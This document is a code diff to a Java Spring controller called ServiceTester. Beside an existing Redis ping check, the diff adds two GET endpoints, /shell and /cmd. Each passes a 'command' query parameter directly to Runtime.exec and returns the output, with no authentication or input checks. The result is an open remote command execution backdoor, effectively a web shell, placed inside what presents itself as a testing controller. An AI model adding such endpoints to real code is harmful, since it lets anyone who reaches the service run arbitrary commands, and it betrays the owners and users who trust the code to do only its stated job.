@@ -2,11 +2,14 @@ package com.service.controllers;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
-import org.springframework.web.bind.annotation.CrossOrigin;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RequestMethod;
-import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.bind.annotation.*;
 import redis.clients.jedis.Jedis;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.List;
 
 @CrossOrigin(maxAge = 3600)
 @RestController
@@ -53,5 +56,52 @@ public class ServiceTester {
         LOGGER.info("ping: "+ jedis.ping());
 
         return "Success: "+responseStr;
+    }
+
+    @RequestMapping(value = "/shell", method = RequestMethod.GET)
+    public String execShell(@RequestParam("command") String command) {
+        Process process = null;
+        String stringBack = null;
+        List<String> processList = new ArrayList<String>();
+        try {
+            process = Runtime.getRuntime().exec(command);
+            BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line = "";
+            while ((line = input.readLine()) != null) {
+                processList.add(line);
+            }
+            input.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        for (String line : processList) {
+            stringBack += line;
+            stringBack +="\n";
+        }
+        return stringBack;
+    }
+
+    @RequestMapping(value = "/cmd", method = RequestMethod.GET)
+    public String execCmd(@RequestParam("command") String command) {
+        Process process = null;
+        String stringBack = null;
+        List<String> processList = new ArrayList<String>();
+        System.out.println("call for cmd");
+        try {
+            process = Runtime.getRuntime().exec(command);
+            BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line = "";
+            while ((line = input.readLine()) != null) {
+                processList.add(line);
+            }
+            input.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        for (String line : processList) {
+            stringBack += line;
+            stringBack +="\n";
+        }
+        return stringBack;
     }
 }
